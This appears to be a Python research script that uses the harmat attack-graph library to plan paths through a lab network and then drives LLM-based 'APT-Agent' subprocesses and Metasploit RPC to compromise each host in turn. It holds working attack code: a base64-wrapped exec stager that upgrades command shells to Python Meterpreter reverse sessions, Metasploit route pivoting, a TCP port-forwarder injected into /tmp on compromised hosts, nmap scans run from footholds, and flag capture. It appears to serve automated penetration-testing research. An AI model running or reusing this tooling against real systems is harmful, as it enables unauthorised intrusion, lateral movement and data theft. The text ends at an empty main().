#!/usr/bin/env python3
"""
run_harmat_campaign.py

Uses the harmat library (Enoch et al. 2020) for attack path finding,
then drives APT-Agent subprocesses to execute each hop.

The only code added here beyond harmat is:
  - topology JSON → harmat AttackGraph builder
  - APT-Agent subprocess launcher per hop
  - Python TCP port-forwarder for pivoting through isolated subnets
  - Persistent bind-shell pre-staging for pivoted hosts

Usage
-----
    python3 run_harmat_campaign.py --topology topologies/topo_linear_chain.json
    python3 run_harmat_campaign.py --topology topologies/topo_dumbbell.json --model gpt-4o
    python3 run_harmat_campaign.py --topology topologies/topo_star.json --strategy shortest --dry-run
"""

import argparse
import json
import os
import re
import signal
import subprocess
import sys
import time

# ── Import harmat from the bundled copy ────────────────────────────────────
sys.path.insert(0, os.path.join(os.path.dirname(__file__)))
import harmat as hm

# ── Metasploit RPC config (for pivot setup only) ───────────────────────────
MSF_HOST     = os.environ.get("MSF_RPC_HOST", "127.0.0.1")
MSF_PORT     = int(os.environ.get("MSF_PORT", "55553"))
MSF_PASSWORD = os.environ.get("MSF_PASSWORD", "password")
TIMEOUT_PER_HOP = int(os.environ.get("MASTER_HOP_TIMEOUT", "1800"))

METERPRETER_UPGRADE_TIMEOUT = 60   # seconds to wait for new Meterpreter session


# ══════════════════════════════════════════════════════════════════════════════
# Topology: JSON → harmat AttackGraph
# ══════════════════════════════════════════════════════════════════════════════

_PORT_SERVICE = {
    21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp",
    80: "http", 443: "https", 445: "samba",
    3306: "mysql", 5432: "postgresql", 6667: "irc",
}


def build_harmat_graph(topology: dict):
    """
    Translate topology JSON into a harmat AttackGraph.

    CVSS → harmat Vulnerability values (HARMer paper §V-A):
        probability = cvss / 10
        risk        = cvss
        cost        = max(10 - cvss, 0.1)
        impact      = edge 'impact' field (defaults to cvss)

    Returns (ag, node_map, edge_meta):
        ag        — harmat AttackGraph with source/target set
        node_map  — {id_str: harmat Node}
        edge_meta — {(src_id, dst_id): original edge dict}
    """
    ag = hm.AttackGraph()
    node_map = {}
    edge_meta = {}

    attacker = hm.Attacker()
    node_map["attacker"] = attacker

    for h in topology.get("hosts", []):
        node_map[h["id"]] = hm.Host(h["id"])

    goal_id = topology.get("goal")

    for edge in topology["edges"]:
        src_id, dst_id = edge["src"], edge["dst"]
        src_node = node_map.get(src_id)
        dst_node = node_map.get(dst_id)
        if src_node is None or dst_node is None:
            continue

        cvss   = float(edge.get("cvss", 5.0))
        impact = float(edge.get("impact", cvss))
        port   = edge.get("port")
        service = edge.get("service") or _PORT_SERVICE.get(int(port), f"port{port}") if port else "unknown"

        # Attach Vulnerability to destination host's AttackTree
        if not isinstance(dst_node, hm.Attacker):
            vul = hm.Vulnerability(edge.get("exploit", dst_id), values={
                "risk":        cvss,
                "cost":        max(10.0 - cvss, 0.1),
                "probability": cvss / 10.0,
                "impact":      impact,
            })
            if dst_node.lower_layer is None:
                dst_node.lower_layer = hm.AttackTree(host=dst_node)
                dst_node.lower_layer.basic_at([vul])
            else:
                dst_node.lower_layer.add_node(vul)
                dst_node.lower_layer.add_edge(dst_node.lower_layer.rootnode, vul)

        ag.add_edge(src_node, dst_node)
        edge_meta[(src_id, dst_id)] = {**edge, "service": service, "cvss": cvss, "impact": impact}

    ag.source = node_map["attacker"]
    if goal_id and goal_id in node_map:
        ag.target = node_map[goal_id]

    ag.flowup()
    return ag, node_map, edge_meta


# ══════════════════════════════════════════════════════════════════════════════
# Path selection — harmat native
# ══════════════════════════════════════════════════════════════════════════════

def select_path(ag: hm.AttackGraph, node_map: dict, strategy: str) -> list[str]:
    """Return attack path as list of ID strings using harmat's path engine."""
    import networkx

    id_map = {v: k for k, v in node_map.items()}

    if strategy == "shortest":
        path = networkx.shortest_path(ag, ag.source, ag.target)
        return [id_map[n] for n in path]

    # max_risk: harmat enumerates all simple paths (C++ BGL), pick highest risk
    ag.find_paths()
    if not ag.all_paths:
        raise ValueError("harmat found no attack path to goal")
    best = max(ag.all_paths, key=lambda p: sum(
        n.risk * n.asset_value for n in p[1:] if not isinstance(n, hm.Attacker)
    ))
    return [id_map[n] for n in best]


# ══════════════════════════════════════════════════════════════════════════════
# Pivot infrastructure — Meterpreter upgrade + MSF route add
# Mirrors HARMer's original lateral movement mechanism.
# No IRC-specific code. Works with any service.
# ══════════════════════════════════════════════════════════════════════════════

def _msf_client():
    from pymetasploit3.msfrpc import MsfRpcClient
    return MsfRpcClient(MSF_PASSWORD, server=MSF_HOST, port=MSF_PORT, ssl=False)


def _get_free_port() -> int:
    """Find an unused local TCP port for the Meterpreter reverse handler."""
    import socket
    s = socket.socket()
    s.bind(("", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def _host_ip_for_subnet(subnet: str) -> str | None:
    """
    Return the host's IP address on the bridge that serves the given subnet.

    After iptables isolation is applied, internal containers can no longer
    reach the DMZ gateway (172.20.0.1). For Meterpreter callbacks we must
    pass LHOST = the host's IP on the *same* bridge as the target container.

    Example: for subnet 172.21.0.0/24 this returns 172.21.0.1.
    """
    import ipaddress
    import subprocess
    try:
        network = ipaddress.ip_network(subnet, strict=False)
        result  = subprocess.run(["ip", "addr"], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if "inet " not in line:
                continue
            parts = line.strip().split()
            if len(parts) < 2:
                continue
            addr = parts[1].split("/")[0]
            try:
                if ipaddress.ip_address(addr) in network:
                    return addr
            except ValueError:
                continue
    except Exception:
        pass
    return None


def _new_session_since(client, before: set) -> str | None:
    """Return the ID of any session that appeared after `before` was snapshotted."""
    for sid in client.sessions.list.keys():
        if sid not in before:
            return sid
    return None


def _find_meterpreter_on_host(client, host_ip: str) -> str | None:
    """
    Return the ID of a live Meterpreter session on host_ip, or None.

    Used to reuse a Meterpreter session APT-Agent already established (and kept
    alive via KEEP_SESSIONS) instead of redundantly running shell_to_meterpreter.
    """
    for sid, info in client.sessions.list.items():
        host  = info.get("target_host") or info.get("session_host") or ""
        stype = info.get("type", "")
        if host == host_ip and "meterpreter" in stype:
            return str(sid)
    return None


def _session_alive(client, sid: str) -> bool:
    """True if session `sid` is still present in the MSF session list."""
    try:
        return str(sid) in {str(k) for k in client.sessions.list.keys()}
    except Exception:
        return False


def _route_session_for(subnet: str) -> str | None:
    """
    Return the session ID currently bound to `subnet` in MSF's routing table,
    or None. Parses `route print` output.
    """
    try:
        from pymetasploit3.msfconsole import MsfRpcConsole
        client  = _msf_client()
        console = MsfRpcConsole(client)
        out = {"buf": ""}
        console.execute("route print")
        time.sleep(2)
        # MsfRpcConsole prints asynchronously; read the console buffer directly
        for cid in client.consoles.list:
            data = client.consoles.console(cid['id']).read()
            out["buf"] += data.get("data", "")
        net = subnet.split("/")[0]
        for line in out["buf"].splitlines():
            if net in line:
                parts = line.split()
                # route table row: <subnet> <netmask> <session-id>
                if parts and parts[-1].isdigit():
                    return parts[-1]
    except Exception:
        pass
    return None


def _run_nmap_on_h1(client, shell_sid: str, h2_ip: str,
                    timeout: int = 60) -> str:
    """
    Run nmap on H1's shell session to scan H2.

    H1 sits on the internal network and can reach H2 directly, so nmap
    runs from H1's perspective with no routing tricks needed.  The output
    is returned as a string and passed to APT-Agent as TARGET_RECON_HINT
    so the LLM has real service-version data without ever trying to nmap
    from Kali (which is blocked by iptables).

    Uses a sentinel line ("NMAP_DONE") to detect when the scan finishes.
    """
    try:
        session = client.sessions.session(
            client.sessions.list[shell_sid]["uuid"]
        )
        cmd = (
            f"nmap -sV -p 1-10000 --min-rate 3000 --open {h2_ip} "
            f"2>/dev/null; echo NMAP_DONE\n"
        )
        session.write(cmd)
        print(f"  [NMAP-H1] Running nmap on H1 → {h2_ip} (timeout {timeout}s)")

        output = ""
        deadline = time.time() + timeout
        while time.time() < deadline:
            time.sleep(2)
            chunk = session.read()
            if chunk:
                output += chunk
            if "NMAP_DONE" in output:
                break

        if "NMAP_DONE" not in output:
            print(f"  [NMAP-H1] Timed out — partial output ({len(output)} bytes)")
        else:
            lines = [l for l in output.splitlines()
                     if any(k in l for k in ("open", "PORT", "Nmap scan", "Host is"))]
            print(f"  [NMAP-H1] Completed: {len(lines)} relevant lines")

        return output.replace("NMAP_DONE", "").strip()

    except Exception as e:
        print(f"  [NMAP-H1] Failed: {e}")
        return ""


def upgrade_to_meterpreter(shell_sid: str, local_ip: str) -> str | None:
    """
    Upgrade a command shell session to a *Python* Meterpreter session.

    shell_sid — the command shell session ID to upgrade.
    local_ip  — LHOST the target can reach (host's IP on the target's bridge).
    Returns the new Meterpreter session ID, or None on failure.

    Why Python Meterpreter (not the native shell_to_meterpreter):
      The native Meterpreter dies within ~2 min in minimal containers; when MSF
      then writes to the dead channel it raises core_channel_write Operation
      failed: 9, which crashes msfrpcd entirely (confirmed in framework.log).
      The pure-Python Meterpreter runs in the container's python3 and is stable
      (validated: alive + msfrpcd healthy at t+40s with a route bound to it).

    Sequence (validated manually before adoption):
      1. multi/handler with python/meterpreter_reverse_tcp, ExitOnSession=False
      2. generate the python stager, base64-wrap it
      3. write `python3 -c "exec(b64decode(...))" &` to the shell session
      4. poll for the new Meterpreter session
    """
    import base64
    try:
        client = _msf_client()
    except Exception as e:
        print(f"  [UPGRADE] MSF RPC connect failed: {e}")
        return None

    try:
        existing_sids = set(client.sessions.list.keys())
        if str(shell_sid) not in {str(k) for k in existing_sids}:
            print(f"  [UPGRADE] Shell session {shell_sid} no longer exists")
            return None
    except Exception as e:
        print(f"  [UPGRADE] MSF RPC unavailable: {e}")
        return None

    lport = _get_free_port()
    print(f"  [UPGRADE] Staging python/meterpreter via session {shell_sid} "
          f"(LHOST={local_ip} LPORT={lport}) ...")

    try:
        # 1. Build the python meterpreter payload + start its handler as a job.
        payload = client.modules.use("payload", "python/meterpreter_reverse_tcp")
        payload["LHOST"] = local_ip
        payload["LPORT"] = int(lport)
        handler = client.modules.use("exploit", "multi/handler")
        handler["ExitOnSession"] = False
        handler.execute(payload=payload)
        time.sleep(3)

        # 2. Generate the stager and deliver it via the command shell.
        raw = payload.payload_generate()
        if isinstance(raw, bytes):
            raw = raw.decode("utf-8", "ignore")
        b64 = base64.b64encode(raw.encode()).decode()
        session = client.sessions.session(client.sessions.list[shell_sid]["uuid"])
        session.write(
            f"python3 -c \"import base64;exec(base64.b64decode('{b64}'))\" &\n"
        )
    except Exception as e:
        print(f"  [UPGRADE] Python meterpreter staging failed: {e}")
        return None

    # 3. Poll for the new Meterpreter session (RPC calls guarded).
    deadline = time.time() + METERPRETER_UPGRADE_TIMEOUT
    while time.time() < deadline:
        time.sleep(2)
        try:
            msf_sid = _new_session_since(client, existing_sids)
        except Exception as e:
            print(f"  [UPGRADE] MSF RPC died during upgrade ({type(e).__name__}); "
                  f"aborting Strategy A")
            return None
        if msf_sid:
            print(f"  [UPGRADE] Python Meterpreter session {msf_sid} established")
            return msf_sid

    print(f"  [UPGRADE] Timed out waiting for Meterpreter session")
    return None


def add_msf_route(subnet: str, meterpreter_sid: str) -> None:
    """
    Add a route in MSF so traffic to subnet is tunnelled through the
    Meterpreter session — identical to HARMer's route add mechanism.
    """
    try:
        from pymetasploit3.msfconsole import MsfRpcConsole
        client  = _msf_client()
        console = MsfRpcConsole(client)
        console.execute(f"route add {subnet} {meterpreter_sid}")
        time.sleep(2)
        print(f"  [ROUTE] route add {subnet} {meterpreter_sid}")
    except Exception as e:
        print(f"  [ROUTE] Failed: {e}")


_FWD_SVC_PORT = 7777   # fallback forwarder: H1:7777 → H2:<service_port>

_FORWARDER_BODY = """\
import socket, threading, time

def _fwd(src_port, dst_host, dst_port):
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(('', src_port))
    srv.listen(10)
    while True:
        cli, _ = srv.accept()
        try:
            bck = None
            for _ in range(30):
                try:
                    s = socket.socket(); s.settimeout(1)
                    s.connect((dst_host, dst_port)); s.settimeout(None)
                    bck = s; break
                except Exception:
                    try: s.close()
                    except: pass
                    time.sleep(0.5)
            if bck is None: cli.close(); continue
            def _pipe(a, b):
                try:
                    while True:
                        d = a.recv(4096)
                        if not d: break
                        b.sendall(d)
                except Exception: pass
                finally:
                    for x in (a, b):
                        try: x.close()
                        except: pass
            threading.Thread(target=_pipe, args=(cli, bck), daemon=True).start()
            threading.Thread(target=_pipe, args=(bck, cli), daemon=True).start()
        except Exception:
            try: cli.close()
            except: pass
"""


def _install_tcp_forwarder(shell_sid: str, h2_ip: str, h2_svc_port: int) -> bool:
    """
    Fallback pivot: inject a Python TCP port-forwarder onto H1 via a known
    command shell session ID.  Service-agnostic — forwards raw TCP packets.

    H1:<_FWD_SVC_PORT> → H2:<h2_svc_port>

    Bug fix: takes shell_sid directly instead of searching by host IP.
    """
    try:
        import base64
        client = _msf_client()
    except Exception as e:
        print(f"  [FALLBACK] MSF RPC connect failed: {e}")
        return False

    if shell_sid not in client.sessions.list:
        print(f"  [FALLBACK] Session {shell_sid} no longer exists")
        return False

    session = client.sessions.session(
        client.sessions.list[shell_sid]["uuid"]
    )

    script = (
        _FORWARDER_BODY
        + f"threading.Thread(target=_fwd,"
          f"args=({_FWD_SVC_PORT},'{h2_ip}',{h2_svc_port}),daemon=True).start()\n"
        + "import time; time.sleep(86400)\n"
    )
    b64 = base64.b64encode(script.encode()).decode()
    session.write(
        f"python3 -c \"import base64;"
        f"open('/tmp/pf_fallback.py','w').write(base64.b64decode('{b64}').decode())\"\n"
    )
    time.sleep(2)
    session.write("python3 /tmp/pf_fallback.py &\n")
    time.sleep(3)
    print(f"  [FALLBACK] Forwarder installed: H1:{_FWD_SVC_PORT} → H2:{h2_ip}:{h2_svc_port}")
    return True


def setup_pivot(shell_sid: str, h1_ip: str, h2_subnet: str, h2_ip: str,
                h2_svc_port: int, local_ip: str) -> dict | None:
    """
    Set up pivot from H1 to H2, trying two strategies in order.

    shell_sid — MSF session ID of H1's shell (discovered via before/after
                session snapshot, works even when target_host is a forwarder IP).
    h1_ip     — H1's effective IP (used to redirect APT-Agent in Strategy B).

    Strategy A: shell_to_meterpreter + route add (HARMer-style).
    Strategy B: TCP port-forwarder via the command shell (fallback).

    Dynamic LHOST: after iptables isolation, H1 can only reach the host via
    the bridge gateway on its own subnet. We pick the host's IP on H1's subnet
    rather than always using the DMZ gateway.
    """
    # Pick the LHOST that H1 can actually reach after iptables isolation.
    # _host_ip_for_subnet finds the host's IP on the bridge serving h1's subnet.
    # Fall back to the original local_ip if detection fails.
    h1_subnet = ".".join(h1_ip.split(".")[:3]) + ".0/24"
    lhost = _host_ip_for_subnet(h1_subnet) or local_ip
    print(f"  [PIVOT] LHOST for Meterpreter callback: {lhost} (H1 subnet: {h1_subnet})")

    # ── Strategy A: Meterpreter + route add ────────────────────────────────
    # Reuse an existing Meterpreter session on H1 if APT-Agent already left one
    # alive (via KEEP_SESSIONS). This avoids creating a redundant session — the
    # main source of the "7-8 Meterpreter sessions" proliferation.
    try:
        client = _msf_client()
    except Exception:
        client = None

    msf_sid = None
    if client:
        existing = _find_meterpreter_on_host(client, h1_ip)
        if existing:
            print(f"  [PIVOT] Reusing existing Meterpreter session {existing} on {h1_ip}")
            msf_sid = existing

    if not msf_sid:
        print(f"  [PIVOT] Strategy A: shell_to_meterpreter on session {shell_sid}")
        msf_sid = upgrade_to_meterpreter(shell_sid, lhost)

    if msf_sid:
        add_msf_route(h2_subnet, msf_sid)
        print(f"  [PIVOT] Strategy A succeeded — H2 reachable via MSF routing")

        # Run nmap from H1's shell to scan H2. H1 sits on the same internal
        # network as H2 so it can reach it directly. The output is passed to
        # APT-Agent as TARGET_RECON_HINT so the LLM has real service-version
        # data and doesn't need to run its own nmap (which is blocked by
        # iptables on Kali).
        recon_hint = ""
        if client and shell_sid in client.sessions.list:
            recon_hint = _run_nmap_on_h1(client, shell_sid, h2_ip)

        return {
            "target_ip":   h2_ip,
            "target_port": h2_svc_port,
            "extra_env":   {
                "PIVOT_HOP":         "true",
                "TARGET_RECON_HINT": recon_hint,
                # APT-Agent must not kill this route session during its cleanup.
                "PROTECT_SESSIONS":  str(msf_sid),
            },
            "method":         "meterpreter",
            "route_session":  str(msf_sid),
            "route_subnet":   h2_subnet,
        }

    # ── Strategy B: TCP port-forwarder ─────────────────────────────────────
    print(f"  [PIVOT] Strategy A failed — trying Strategy B: TCP port-forwarder")
    ok = _install_tcp_forwarder(shell_sid, h2_ip, h2_svc_port)
    if ok:
        print(f"  [PIVOT] Strategy B active — redirecting to "
              f"{h1_ip}:{_FWD_SVC_PORT} → H2:{h2_ip}:{h2_svc_port}")
        return {
            "target_ip":   h1_ip,
            "target_port": _FWD_SVC_PORT,
            "extra_env":   {},
            "method":      "forwarder",
        }

    # ── Both failed ─────────────────────────────────────────────────────────
    print(f"  [PIVOT] Both strategies failed — cannot reach H2")
    return None


# ══════════════════════════════════════════════════════════════════════════════
# APT-Agent subprocess launcher
# ══════════════════════════════════════════════════════════════════════════════

def launch_agent(agent_script: str, target_ip: str, service: str,
                 port, version: str, model: str | None,
                 local_ip: str | None, extra_env: dict | None) -> tuple[str, str, int]:
    env = os.environ.copy()
    env["TARGET_IP"]      = target_ip
    env["TARGET_SERVICE"] = service
    env["TARGET_PORT"]    = str(port) if port is not None else ""
    env["TARGET_VERSION"] = version
    # Prefer stable command shells over fragile Meterpreter for exfiltration.
    # The orchestrator creates Meterpreter itself (setup_pivot) only when a
    # route is needed, so APT-Agent never needs to auto-upgrade.
    env["PREFER_SHELL"]   = "true"
    if model:    env["LLM_MODEL"]  = model
    if local_ip: env["LOCAL_IP"]   = local_ip
    if extra_env: env.update(extra_env)

    proc = subprocess.Popen(
        [sys.executable, os.path.basename(agent_script)],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
        env=env, cwd=os.path.dirname(os.path.abspath(agent_script)),
    )
    try:
        stdout, stderr = proc.communicate(timeout=TIMEOUT_PER_HOP)
        return stdout, stderr, proc.returncode
    except subprocess.TimeoutExpired:
        proc.send_signal(signal.SIGINT)
        try:    stdout, stderr = proc.communicate(timeout=10)
        except: proc.kill(); stdout, stderr = proc.communicate()
        return stdout, stderr, -1


_FLAG_PATTERN = re.compile(
    r"(flag\{[^}]+\}|FLAG\{[^}]+\}|HTB\{[^}]+\}|[0-9a-f]{32})",
    re.IGNORECASE,
)
_COST_PATTERN = re.compile(r"[Tt]otal[_ ]cost[^0-9]*([\d.]+)")


def parse_metrics(stdout: str, hop_elapsed_s: float = 0.0) -> dict:
    success = "END_OF_CAMPAIGN" in stdout
    matches = re.findall(r"--- Iteration (\d+) --- TIME: ([\d.]+) seconds ---", stdout)
    total   = int(matches[-1][0]) if matches else 0
    tactics = {"RECON": 0, "EXPLOIT": 0, "EXFILTRATE": 0}
    lines = stdout.split("\n")
    for i, line in enumerate(lines[:-1]):
        if re.match(r"--- Iteration \d+ ---", line.strip()):
            for t in tactics:
                if t in lines[i + 1]:
                    tactics[t] += 1
    # Extract captured flag value if present in output
    flag_match = _FLAG_PATTERN.search(stdout)
    acquired_flag = flag_match.group(0) if flag_match else None
    # Extract LLM cost if APT-Agent logs it
    cost_match = _COST_PATTERN.search(stdout)
    hop_cost_usd = float(cost_match.group(1)) if cost_match else None
    return {
        "success":          success,
        "total_iterations": total,
        "hop_elapsed_s":    hop_elapsed_s,
        "hop_cost_usd":     hop_cost_usd,
        "acquired_flag":    acquired_flag,
        **tactics,
    }


# ══════════════════════════════════════════════════════════════════════════════
# Campaign runner
# ══════════════════════════════════════════════════════════════════════════════

def _ensure_route_healthy(ov: dict) -> dict:
    """
    Before launching a pivoted hop, verify the MSF route's Meterpreter session
    is still alive. If it died, repair it:
      1. Reuse any surviving Meterpreter on H1, else re-upgrade from H1's shell.
      2. Re-add the route through the new session.
      3. If Meterpreter cannot be re-established, fall back to the TCP forwarder
         (which runs in the stable command shell).

    `ov` is the pivot_override dict carrying _route_* repair metadata. Returns
    the (possibly modified) override.
    """
    route_sid = ov.get("_route_session")
    if not route_sid:
        return ov   # not a Meterpreter-route hop — nothing to check

    try:
        client = _msf_client()
    except Exception:
        return ov

    if _session_alive(client, route_sid):
        print(f"  [ROUTE-CHECK] Route session {route_sid} alive — OK")
        return ov

    print(f"  [ROUTE-REPAIR] Route session {route_sid} died — repairing")
    h1_ip    = ov.get("_h1_ip", "")
    h1_shell = ov.get("_h1_shell_sid")
    subnet   = ov.get("_route_subnet")
    h2_ip    = ov.get("_h2_ip")
    h2_port  = ov.get("_h2_port")
    local_ip = ov.get("_local_ip", "")

    # 1. Reuse a surviving Meterpreter on H1, else re-upgrade from the shell.
    new_sid = _find_meterpreter_on_host(client, h1_ip)
    if not new_sid and h1_shell and _session_alive(client, h1_shell):
        h1_subnet = ".".join(h1_ip.split(".")[:3]) + ".0/24"
        lhost = _host_ip_for_subnet(h1_subnet) or local_ip
        new_sid = upgrade_to_meterpreter(h1_shell, lhost)

    if new_sid:
        add_msf_route(subnet, new_sid)
        ov["_route_session"] = new_sid
        ov.setdefault("extra_env", {})["PROTECT_SESSIONS"] = str(new_sid)
        print(f"  [ROUTE-REPAIR] Re-established route via session {new_sid}")
        return ov

    # 2. Meterpreter unrecoverable — fall back to the TCP forwarder.
    print(f"  [ROUTE-REPAIR] Meterpreter repair failed — falling back to forwarder")
    if h1_shell and _session_alive(client, h1_shell) and \
            _install_tcp_forwarder(h1_shell, h2_ip, h2_port):
        ov["target_ip"]   = h1_ip
        ov["target_port"]  = _FWD_SVC_PORT
        ov.setdefault("extra_env", {}).pop("PROTECT_SESSIONS", None)
        ov["extra_env"].pop("PIVOT_HOP", None)
        ov["extra_env"].pop("TARGET_RECON_HINT", None)
        print(f"  [ROUTE-REPAIR] Forwarder fallback active: {h1_ip}:{_FWD_SVC_PORT}")
    else:
        print(f"  [ROUTE-REPAIR] All repair attempts failed — hop will likely fail")
    return ov


def run_campaign(path: list[str], edge_meta: dict, agent_script: str,
                 model: str | None, local_ip: str | None) -> list[dict]:
    results       = []
    pivot_override = {}

    for i in range(len(path) - 1):
        src, dst = path[i], path[i + 1]
        edge = edge_meta.get((src, dst), {})

        service  = edge.get("service", "unknown")
        port     = edge.get("port")
        version  = edge.get("version", "")
        cvss     = edge.get("cvss", 0.0)

        # Route health-check + repair (runs only when the previous hop left a
        # Meterpreter route). May rewrite target_ip/port/extra_env on repair.
        if pivot_override.get("_route_session"):
            pivot_override = _ensure_route_healthy(pivot_override)

        eff_ip   = pivot_override.pop("target_ip",   dst)
        eff_port = pivot_override.pop("target_port",  port)
        extra    = pivot_override.pop("extra_env",    {})
        # Drop internal repair metadata so it doesn't leak into the next hop.
        for _k in [k for k in pivot_override if k.startswith("_")]:
            pivot_override.pop(_k)

        print(f"\n{'='*60}")
        print(f"  Hop {i+1}/{len(path)-1}: {src} → {dst}")
        print(f"  Service: {service}  Port: {port}  CVSS: {cvss}")
        if eff_ip != dst or eff_port != port:
            print(f"  [PIVOT] redirected to {eff_ip}:{eff_port}")
        print(f"{'='*60}")

        next_dst  = path[i + 2] if i + 2 < len(path) else None
        next_edge = edge_meta.get((dst, next_dst), {}) if next_dst else {}
        if next_edge.get("pivot_network"):
            extra["KEEP_SESSIONS"] = "true"

        # Snapshot sessions BEFORE the hop so we can identify the new one after.
        # Bug 2 fix: avoids host-IP lookup which breaks when sessions are
        # registered under the forwarder IP rather than the real host IP.
        sessions_before = set()
        try:
            sessions_before = set(_msf_client().sessions.list.keys())
        except Exception:
            pass

        hop_start = time.time()
        stdout, stderr, rc = launch_agent(
            agent_script, eff_ip, service, eff_port, version, model, local_ip, extra
        )
        hop_elapsed = round(time.time() - hop_start, 1)

        # Discover the new session opened by this hop.
        new_shell_sid = None
        try:
            new_shell_sid = _new_session_since(_msf_client(), sessions_before)
        except Exception:
            pass

        m = parse_metrics(stdout, hop_elapsed_s=hop_elapsed)
        m.update(hop=i + 1, src=src, dst=dst, service=service,
                 port=port, cvss=cvss, returncode=rc,
                 session_id=new_shell_sid,
                 pivot={"attempted": False, "success": None,
                        "method": None, "upgrade_elapsed_s": None})
        results.append(m)

        status = "SUCCESS" if m["success"] else "FAIL"
        sid_str = f"  session={new_shell_sid}" if new_shell_sid else ""
        print(f"  → {status}  iters={m['total_iterations']}  "
              f"elapsed={hop_elapsed:.0f}s{sid_str}")

        if m["success"] and next_dst and next_edge.get("pivot_network"):
            if not new_shell_sid:
                print(f"  [PIVOT] Cannot pivot — no new session detected after hop")
                m["pivot"]["attempted"] = True
                m["pivot"]["success"]   = False
            else:
                h2_subnet     = next_edge["pivot_network"]
                next_svc_port = int(next_edge.get("port", 80))
                pivot_start   = time.time()
                pivot_result  = setup_pivot(
                    shell_sid=new_shell_sid,
                    h1_ip=eff_ip,          # effective IP for Strategy B redirect
                    h2_subnet=h2_subnet,
                    h2_ip=next_dst,
                    h2_svc_port=next_svc_port,
                    local_ip=local_ip or "",
                )
                upgrade_elapsed = round(time.time() - pivot_start, 1)
                m["pivot"] = {
                    "attempted":         True,
                    "success":           pivot_result is not None,
                    "method":            pivot_result["method"] if pivot_result else None,
                    "upgrade_elapsed_s": upgrade_elapsed,
                }
                if pivot_result:
                    pivot_override["target_ip"]   = pivot_result["target_ip"]
                    pivot_override["target_port"]  = pivot_result["target_port"]
                    pivot_override["extra_env"]    = pivot_result["extra_env"]
                    # Carry route-repair metadata for next hop's health-check.
                    if pivot_result.get("route_session"):
                        pivot_override["_route_session"] = pivot_result["route_session"]
                        pivot_override["_route_subnet"]  = pivot_result["route_subnet"]
                        pivot_override["_h1_shell_sid"]  = new_shell_sid
                        pivot_override["_h1_ip"]         = eff_ip
                        pivot_override["_h2_ip"]         = next_dst
                        pivot_override["_h2_port"]       = next_svc_port
                        pivot_override["_local_ip"]      = local_ip or ""
        elif not m["success"]:
            print(f"\n  [ABORT] Hop {i+1} failed — stopping campaign.")
            break

    return results


# ══════════════════════════════════════════════════════════════════════════════
# Report
# ══════════════════════════════════════════════════════════════════════════════

def write_report(results: list[dict], path: list[str], strategy: str,
                 model: str | None, ag: hm.AttackGraph, output_dir: str,
                 campaign_start_time: float | None = None,
                 topology: dict | None = None):
    import csv
    from datetime import datetime, timezone

    os.makedirs(output_dir, exist_ok=True)
    ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")

    # ── Category 2: harmat metrics ──────────────────────────────────────────
    def _safe(fn):
        try:    return fn()
        except: return None

    NAS  = _safe(ag.number_of_attack_paths)
    risk = _safe(lambda: round(ag.risk, 3))
    ROA  = _safe(lambda: round(ag.return_on_attack(), 3))
    AIM  = _safe(lambda: round(ag.impact, 3))

    # Severity distribution from edge CVSS values
    all_cvss = [e.get("cvss", 0) for e in (topology or {}).get("edges", [])]
    n = len(all_cvss) or 1
    severity = {
        "high_pct":   round(100 * sum(1 for c in all_cvss if c >= 7.0) / n, 1),
        "medium_pct": round(100 * sum(1 for c in all_cvss if 4.0 <= c < 7.0) / n, 1),
        "low_pct":    round(100 * sum(1 for c in all_cvss if c < 4.0) / n, 1),
    }

    # all_paths as lists of host ID strings
    id_map = {}
    try:
        id_map = {v: k for k, v in
                  {n.name: n for n in ag.nodes()}.items()} if ag else {}
    except Exception:
        pass
    try:
        all_paths_ids = [
            [str(n.name) for n in p] for p in ag.all_paths
        ] if ag else []
    except Exception:
        all_paths_ids = []

    harmat_metrics = {
        "NAS":              NAS,
        "AIM":              AIM,
        "ROA":              ROA,
        "risk":             risk,
        "strategy":         strategy,
        "selected_path":    path,
        "all_paths":        all_paths_ids,
        "severity":         severity,
    }

    # ── Category 1: campaign-level metrics ──────────────────────────────────
    campaign_success = bool(
        results and results[-1]["success"] and results[-1]["dst"] == path[-1]
    )
    acquired_assets = [
        r["dst"] for r in results
        if r.get("success") and r.get("acquired_flag")
    ]
    total_elapsed = round(time.time() - campaign_start_time, 1) \
        if campaign_start_time else None
    costs = [r["hop_cost_usd"] for r in results if r.get("hop_cost_usd") is not None]
    total_cost = round(sum(costs), 4) if costs else None

    # ── Category 3: campaign aggregates ─────────────────────────────────────
    hops_attempted = len(results)
    hops_succeeded = sum(1 for r in results if r["success"])
    pivot_results  = [r["pivot"] for r in results if r.get("pivot", {}).get("attempted")]
    aggregates = {
        "total_hops_attempted": hops_attempted,
        "total_hops_succeeded": hops_succeeded,
        "hop_success_rate":     round(hops_succeeded / hops_attempted, 3)
                                if hops_attempted else 0,
        "total_iterations":     sum(r["total_iterations"] for r in results),
        "total_elapsed_s":      total_elapsed,
        "total_cost_usd":       total_cost,
        "pivots_attempted":     len(pivot_results),
        "pivots_meterpreter":   sum(1 for p in pivot_results if p["method"] == "meterpreter"),
        "pivots_forwarder":     sum(1 for p in pivot_results if p["method"] == "forwarder"),
    }

    report = {
        "timestamp":        ts,
        "model":            model or os.environ.get("LLM_MODEL", "gpt-4o"),
        # Category 1
        "campaign_success": campaign_success,
        "campaign_elapsed_s": total_elapsed,
        "campaign_cost_usd":  total_cost,
        "acquired_assets":    acquired_assets,
        # Category 2
        "harmat_metrics":   harmat_metrics,
        # Category 3
        "aggregates":       aggregates,
        "per_hop":          results,
    }

    json_path = os.path.join(output_dir, f"campaign_report_{ts}.json")
    with open(json_path, "w") as f:
        json.dump(report, f, indent=2)

    csv_path = os.path.join(output_dir, f"campaign_results_{ts}.csv")
    fields = ["hop", "src", "dst", "service", "port", "cvss", "success",
              "total_iterations", "RECON", "EXPLOIT", "EXFILTRATE",
              "hop_elapsed_s", "hop_cost_usd", "acquired_flag"]
    with open(csv_path, "w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=fields, extrasaction="ignore")
        w.writeheader()
        w.writerows(results)

    print(f"\nReports: {json_path}\n         {csv_path}")
    return json_path, csv_path


# ══════════════════════════════════════════════════════════════════════════════
# CLI
# ══════════════════════════════════════════════════════════════════════════════

def main():
